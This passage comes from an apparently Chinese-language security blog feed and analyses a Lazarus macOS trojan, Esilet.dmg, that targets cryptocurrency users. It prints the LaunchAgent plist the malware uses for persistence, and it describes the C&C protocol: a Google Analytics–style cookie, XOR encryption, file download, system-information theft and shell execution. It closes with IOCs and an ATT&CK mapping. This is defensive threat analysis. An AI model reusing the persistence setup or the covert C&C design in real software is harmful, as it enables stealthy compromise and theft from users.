class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">plist</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//Apple//DTD PLIST 1.0//EN&quot;</span> ...&gt;</span></span><br><span class="line">&lt;plistversion=&quot;1.0&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>Label<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>com.applex.services.agent.agent<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>ProgramArguments<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>/Users/user/Desktop/Esilet-tmpg7lpp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>daemon<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>KeepAlive<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">false</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>RunAtLoad<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-C-amp-C指令"><a href="#2-C-amp-C指令" class="headerlink" title="2. C&amp;C指令"></a>2. C&amp;C指令</h3><h4 id="2-1-初始化C-amp-C连接"><a href="#2-1-初始化C-amp-C连接" class="headerlink" title="2.1 初始化C&amp;C连接"></a>2.1 初始化C&amp;C连接</h4><p>通过分析反编译的代码，恶意程序应该预备了10个C&amp;C地址用于通信，但是实际上只使用了三个地址。</p><p><img src="7427f1ce/37c6205e3e4e6604eb3a7188d3ffd5f4.png"></p><p>&emsp;&emsp;如果macOS系统在连网的使用使用了代理,则与C&amp;C通信的时候也使用代理来连接。通过执行shell命令networksetup来查看所有的网络服务，并从其输出的结果解析出使用的代理地址和端口。</p><p><img src="7427f1ce/66fd33a7a8569838f4eee1a2b33dec4f.png"></p><p>恶意程序还硬编码了一些USER_AGENT列表，在首次与C&amp;C进行连接的时候随机从列表中挑选一个。</p><p><img src="7427f1ce/d56e6df8f5696993ec393bc32bb924e3.png"></p><p>生成随机数作为索引从C&amp;C地址列表中选择一个作为当前使用的C&amp;C地址然后发送握手包进行验证。</p><p><img src="7427f1ce/e1bc94021365ba8bb632842cefe0c327.png"></p><h4 id="2-2-C-amp-C通信方式"><a href="#2-2-C-amp-C通信方式" class="headerlink" title="2.2 C&amp;C通信方式"></a>2.2 C&amp;C通信方式</h4><p>恶意程序主要通过libcurl来实现C&amp;C通信，使用的协议为HTTP或者HTTPS。</p><p><img src="7427f1ce/b89ccf9b02ff3ab18cc3c30bbfe9f8ca.png"></p><p>与其他的恶意程序不同，该样本使用HTTP请求头的的cookie字段作为标识符来标记受害者。该cookie 被设计为看起来像一个标准的 Google Analytics cookie。</p><p><img src="7427f1ce/9b2836374b34b35ad7db62751ffbce46.png"></p><p>Cookie伪装为Google Analytics使用的cookie格式，使用的cookie格式如下,可以看出关键数据被混在一堆随机数中,通过网络抓包工具很难分析该cookie表示的含义。</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Cookie:</span><br><span class="line">_ga=GA1.%d.%02d%d%d%02d.%d%05d%04d;gid=GA1.%d.%02d%d%03d.%d%05d%04d</span><br><span class="line">_ga=GA1.&lt;<span class="number">1</span>&gt;.&lt;<span class="number">2</span>&gt;&lt;<span class="number">3</span>&gt;&lt;<span class="number">4</span>&gt;&lt;<span class="number">5</span>&gt;.&lt;<span class="number">6</span>&gt;&lt;<span class="number">7</span>&gt;&lt;<span class="number">8</span>&gt;;gid=GA1.&lt;<span class="number">1</span>&gt;.&lt;<span class="number">9</span>&gt;&lt;<span class="number">10</span>&gt;&lt;<span class="number">11</span>&gt;.&lt;<span class="number">6</span>&gt;&lt;<span class="number">7</span>&gt;&lt;<span class="number">8</span>&gt;</span><br><span class="line">其中每一位表示的值如下：</span><br><span class="line"><span class="number">1</span> = <span class="keyword">rand</span> % <span class="number">10</span></span><br><span class="line"><span class="number">2</span> = <span class="keyword">rand</span> % <span class="number">100</span></span><br><span class="line"><span class="number">3</span> = 准备好接收第一条指令则为<span class="number">1</span>，否则为<span class="number">0</span></span><br><span class="line"><span class="number">4</span> = sessionID</span><br><span class="line"><span class="number">5</span> = <span class="keyword">rand</span> % <span class="number">100</span></span><br><span class="line"><span class="number">6</span> = <span class="keyword">rand</span> % <span class="number">10</span></span><br><span class="line"><span class="number">7</span> = <span class="keyword">rand</span> % <span class="number">100000</span></span><br><span class="line"><span class="number">8</span> = <span class="keyword">rand</span> % <span class="number">10000</span></span><br><span class="line"><span class="number">9</span> = <span class="keyword">rand</span> % <span class="number">100</span></span><br><span class="line"><span class="number">10</span> = 如果是握手包则为<span class="number">8678</span>，否则是<span class="number">1879</span></span><br><span class="line"><span class="number">11</span> = <span class="keyword">rand</span> % <span class="number">1000</span></span><br></pre></td></tr></table></figure><h4 id="2-3-发送或接收数据"><a href="#2-3-发送或接收数据" class="headerlink" title="2.3 发送或接收数据"></a>2.3 发送或接收数据</h4><p>恶意程序发送到C&amp;C的数据主要使用post方式，发送到C&amp;C服务器的数据和从C&amp;C接收的数据均为加密状态，加密使用的密钥为硬编码在文件内的数据经过一些运算计算后得出。<br>恶意程序使用两个密钥，一个用于解密接收的数据和一个用于加密post发送的数据，从反编译后的代码可以看出,两者使用相同的密钥来加解密。</p><p><img src="7427f1ce/4b77c0fac5450db777273fcb439272d4.png"></p><p>两者加解密方式一样,都是通过异或前面生成的密钥来加解密。</p><p><img src="7427f1ce/b8773fb152f126052be04bddf3296c8b.png"></p><h4 id="2-4-文件下载"><a href="#2-4-文件下载" class="headerlink" title="2.4 文件下载"></a>2.4 文件下载</h4><p>主要功能为从C&amp;C下载文件，执行的操作有点复杂,每隔阶段都需要向C&amp;C服务器发送消息,比如创建文件成功或失败、文件大小等。<br>首先解密从C&amp;C接收的参数fileSize，解密成功后创建文件，如果文件已经存在则打开文件。</p><p>&emsp;&emsp;使用函数fstat获取文件大小来确定文件已经下载了多少，如果文件没下载完则C&amp;C服务器通将该文件大小作为文件偏移，然后下发该文件偏移后续的文件内容，通过这种方式实现文件续传。</p><p>发送post数据告知C&amp;C服务器文件创建或打开成功,等待其下发要下载文件的数据。<br><img src="7427f1ce/eccee38bc86012af6d3e50e05eddef32.png"></p><p>分段下载文件数据，每次最大下载0x40000大小的文件数据，下载完后发送指令0x3b6669告知C&amp;C服务器下载成功然后接收剩余的文件数据。<br><img src="7427f1ce/6ffe55dfc81b3b8f744c412a736f9ba2.png"></p><h4 id="2-5-通过URL下载文件"><a href="#2-5-通过URL下载文件" class="headerlink" title="2.5 通过URL下载文件"></a>2.5 通过URL下载文件</h4><p>不同于节2.3的文件下载, 该指令是从C&amp;C服务器接收下载地址然后再本地下载文件。</p><p><img src="7427f1ce/2a3bba95a70d97c37a5fe90e2b8e3a6f.png"></p><p>解密从C&amp;C服务器接收的下载指令的参数下载链接和保存路径，利用该libcurl库来下载文件。</p><p><img src="7427f1ce/531fac95473d0cabd713ae473981ffa7.png"></p><h4 id="2-6-获取系统信息"><a href="#2-6-获取系统信息" class="headerlink" title="2.6 获取系统信息"></a>2.6 获取系统信息</h4><p>从受害者电脑上收集主机名、用户名和操作系统版本号等信息加密后上传到C&amp;C服务器。</p><p><img src="7427f1ce/367e28227d1ceaaec2bde24d2d08a33c.png"></p><p>恶意程序收集的信息未加密前的格式如下：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Struct format&#123;</span><br><span class="line">Uint32_t random<span class="comment">;//随机值</span></span><br><span class="line">Uint32_t unkonw1<span class="comment">;</span></span><br><span class="line">Uint32_t unkonw2<span class="comment">;</span></span><br><span class="line">Char host_name[<span class="number">250</span>]<span class="comment">;</span></span><br><span class="line">Char user_name[<span class="number">250</span>]<span class="comment">;</span></span><br><span class="line">Uint32_t ipAddr<span class="comment">;</span></span><br><span class="line">Uint32_t majorVersion<span class="comment">;</span></span><br><span class="line">Uint32_t minorVersion<span class="comment">;</span></span><br><span class="line">Uint32_t buildVersion<span class="comment">;</span></span><br><span class="line">Uint32_t unkonw3<span class="comment">;  //默认为0x20,可能是指操作系统为32位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="获取主机名"><a href="#获取主机名" class="headerlink" title="获取主机名"></a>获取主机名</h5><p>在macOS系统中，由于系统实现机制的原因，并没有提供sysctl命令，但是我们能够使用BSD API函数sysctl来获取系统信息。如下图所示使用函数sysctl来获取主机名。</p><p><img src="7427f1ce/ef2b779b4ce60bdecfe7f7ebfc972192.png"></p><h5 id="获取用户名"><a href="#获取用户名" class="headerlink" title="获取用户名"></a>获取用户名</h5><p>通过函数<strong>getuid</strong>和<strong>getpwuid</strong>来获取指定uid的用户的passwd结构，该结构中的字段pw_name为当前登录用户。</p><p><img src="7427f1ce/ac9a5724aa5feec11792b55373661e45.png"></p><h5 id="获取系统版本号"><a href="#获取系统版本号" class="headerlink" title="获取系统版本号"></a>获取系统版本号</h5><p>恶意程序调用函数popen来执行shell命令,这里执行sw_vers来获取macOS操作系统的版本号。</p><p><img src="7427f1ce/1220f0a190fe9188304031a1f4096112.png"></p><h4 id="2-7-发送心跳包"><a href="#2-7-发送心跳包" class="headerlink" title="2.7 发送心跳包"></a>2.7 发送心跳包</h4><p>以大小为212,内容为0的数据作为心跳包发送C&amp;C服务器告知其恶意程序是否存活。<br><img src="7427f1ce/8feffef01a546735b2aca41cacec09ec.png"></p><h4 id="2-8-命令执行"><a href="#2-8-命令执行" class="headerlink" title="2.8 命令执行"></a>2.8 命令执行</h4><p>恶意程序实现两种版本的shell命令执行功能,两者的区别就是执行命令后是否需要将执行结果上传到C&amp;C服务器。</p><h5 id="不返回执行结果"><a href="#不返回执行结果" class="headerlink" title="不返回执行结果"></a>不返回执行结果</h5><p>通过函数fork创建一个子进程,然后该进程通过函数execv来执行shell命令。<br><img src="7427f1ce/b2700aeeccfdf10c95322e0587fa1516.png"></p><p>当shell命令执行成功时发送指令0x3B3009到C&amp;C服务器，否则发送0x3B2A08。<br><img src="7427f1ce/63f771e7d56b0015171f9411d6d25dd5.png"></p><h5 id="返回执行结果"><a href="#返回执行结果" class="headerlink" title="返回执行结果"></a>返回执行结果</h5><p>由于命令是通过子进程来执行的，因此需要使用函数pipe创建描述符,通过描述符来进行不同进程之间的通信，即将命令执行后的结果从子进程传到父进程。<br><img src="7427f1ce/b7d51f0b88136eeba838538c888760c6.png"></p><p>发送指令0x3b3009告知C&amp;C服务器已经执行命令并等待其派发下一阶段指令。<br><img src="7427f1ce/14481f8b5aa448f58ce72fc9e9b04299.png"></p><p>当下发的指令为0x3B3009时等待子进程执行shell命令结束然上传命令执行后的结果。恶意程序使用函数read从描述符中读取命令执行结果然后分块上传，分块大小为0x40000。<br><img src="7427f1ce/0f165934d570689312b920baa92c844f.png"></p><h1 id="4-IOC"><a href="#4-IOC" class="headerlink" title="4. IOC"></a>4. IOC</h1><p>applex.services.agent<br>hxxps://sche-eg.org/plugins/top.php<br>hxxps://<a href="http://www.vinoymas.ch/wp-content/plugins/top.php">www.vinoymas.ch/wp-content/plugins/top.php</a><br>hxxps://infodigitalnew.com/wp-content/plugins/top.php</p><h1 id="5-ATT-amp-CK矩阵"><a href="#5-ATT-amp-CK矩阵" class="headerlink" title="5. ATT&amp;CK矩阵"></a>5. ATT&amp;CK矩阵</h1><table><thead><tr><th>Tactic</th><th>ID</th><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>Execution</td><td>T1059.004</td><td>Command and Scripting Interpreter: Unix Shell</td><td>通过函数popen函数执行shell命令获取网络信息</td></tr><tr><td></td><td>T1204.002</td><td>User Execution： Malicious File</td><td>诱导用户执行恶意程序</td></tr><tr><td>Persistence</td><td>T1547.015</td><td>Boot or Logon Autostart Execution： Login Items</td><td>MacOS通过plist文件创建LoginItems自启动项</td></tr><tr><td>Command and Control</td><td>T1071.001</td><td>Application Layer Protocol  : Web Protocols</td><td>使用http或者https进行C&amp;C通信</td></tr><tr><td></td><td>T1573.001</td><td>Encrypted Channel: Symmetric Cryptography</td><td>使用异或的方式加解密C&amp;C通信数据</td></tr><tr><td></td><td>T1008</td><td>Fallback Channels</td><td>使用三个C&amp;C地址。</td></tr><tr><td></td><td>T1105</td><td>Ingress Tool Transfer</td><td>从C&amp;C下载文件并执行。</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;近期观察到Lazarus正在针对区块链技术和加密货币行业的各种组织，包括加密货币交易所、去中心化金融协议、游戏赚钱加密货币视频游戏、加密货币贸易公司、风险投资基金投资在加密货币中，以及大量加密货币或有价值的不可替代代币的个人持有者。&lt;br&gt;&amp;emsp;&amp;emsp;Lazarus使用各种通信平台对受害者进行社会工程学，以鼓励受害在在windows或者macOS上下载木马化的加密货币应用程序，然后攻击者使用这些应用程序访问受害者的计算机，在受害者的网络环境中传播恶意软件，并获取私钥或利用其他安全漏洞。这些活动支持发起欺诈性区块链交易的其他后续活动。&lt;/p&gt;
&lt;h1 id=&quot;样本信息&quot;&gt;&lt;a href=&quot;#样本信息&quot; class=&quot;headerlink&quot; title=&quot;样本信息&quot;&gt;&lt;/a&gt;样本信息&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;文件名&lt;/th&gt;
&lt;th&gt;Md5&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Esilet.dmg&lt;/td&gt;
&lt;td&gt;53d9af8829a9c7f6f177178885901c01&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Esilet-tmpg7lpp&lt;/td&gt;
&lt;td&gt;9578c2be6437dcc8517e78a5de1fa975&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h1 id=&quot;3-详细分析&quot;&gt;&lt;a href=&quot;#3-详细分析&quot; class=&quot;headerlink&quot; title=&quot;3. 详细分析&quot;&gt;&lt;/a&gt;3. 详细分析&lt;/h1&gt;&lt;h2 id=&quot;2-1-Esilet-dmg分析&quot;&gt;&lt;a href=&quot;#2-1-Esilet-dmg分析&quot; class=&quot;headerlink&quot; title=&quot;2.1 Esilet.dmg分析&quot;&gt;&lt;/a&gt;2.1 Esilet.dmg分析&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;该恶意程序通过macOS系统专用的磁盘映像格式dmg分发，可以通过命令hdiutil来挂载文件并提取应用程序。&lt;/p&gt;
&lt;img src=&quot;/post/7427f1ce/47e76d051067a5463fc12595faf3c895.png&quot; class=&quot;&quot; title=&quot;example&quot;&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
